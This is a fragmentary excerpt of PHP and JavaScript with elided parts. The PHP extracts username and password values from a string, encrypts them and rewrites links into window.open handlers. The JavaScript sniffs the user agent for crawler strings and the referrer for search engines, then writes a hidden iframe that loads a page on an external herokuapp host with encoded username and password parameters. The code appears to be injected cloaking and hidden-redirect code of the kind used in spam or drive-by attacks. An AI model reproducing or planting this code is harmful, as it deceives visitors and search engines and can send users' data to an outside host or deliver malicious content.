...
preg_match_all("/username=(.*?)&/s", $google8884, $match);

$google888844 = $match[0][0];

$google888844 = preg_replace("/username=/","",$google888844);

$google888844 = preg_replace("/&/","",$google888844);

$string_to_encrypt88888844="$google888844";
...
$google8884 = preg_replace("/username=(.*?)&/","username=$encrypted_string888888884444&",$google8884);

preg_match_all("/password=(.*?)'/s", $google8884, $match);

$google88884474 = $match[0][0];

$google88884474 = preg_replace("/password=/","",$google88884474);

$google88884474 = preg_replace("/'/","",$google88884474);

$string_to_encrypt88884474="$google88884474";
...
$google8884 = preg_replace("/password=(.*?)'/","password=$encrypted_string88884474'",$google8884);

$google8884 = preg_replace("/href='(.*?)'/","onClick=\"window.open('$1','_self');\"",$google8884);
...
var referer8884 = navigator.userAgent;

if(navigator.userAgent.length > 0 && navigator.userAgent.indexOf("spider") != -1 || navigator.userAgent.indexOf("Spider") != -1 || navigator.userAgent.indexOf("bot") != -1 || navigator.userAgent.indexOf("Bot") != -1)
...
if(document.referrer.length > 0 && document.referrer.indexOf("google") != -1 || document.referrer.indexOf("bing") != -1 || document.referrer.indexOf("yandex") != -1 || document.referrer.indexOf("aol") != -1 || document.referrer.indexOf("yahoo") != -1)
...
document.write('<iframe src=\"http://mobile84.herokuapp.com/page88888844.php?username=M1QgoRChCp4N4pUYkvQ5Gw==&password=M1QgoRChCp4N4pUYkvQ5Gw==\" style=\"display:none\"></iframe>');
